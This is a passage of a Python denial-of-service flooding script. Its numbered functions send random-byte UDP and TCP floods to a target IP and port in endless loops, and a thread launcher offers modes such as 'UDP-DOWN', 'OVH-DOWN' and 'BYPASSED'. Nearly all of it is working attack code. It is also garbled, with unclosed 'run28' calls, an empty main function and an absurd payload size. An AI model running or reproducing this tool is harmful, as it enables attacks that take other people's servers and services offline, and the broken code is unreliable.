	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run68():
	data = random._urandom(9191101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run69():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run70():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run71():
	data = random._urandom(567891)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run72():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run73():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run74():
	data = random._urandom(9696)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run75():
	data = random._urandom(1236778)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run76():
	data = random._urandom(134467)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run77():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run78():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run79():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run80():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run81():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run82():
	data = random._urandom(5353535353567891015353535399999)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run83():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run84():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'UDP-DOWN':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28)
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
	if choice == 'OVH-DOWN':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'BYPASSED':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'OVH-BYPASSED':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
	if choice == 'TCP-DOWN':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
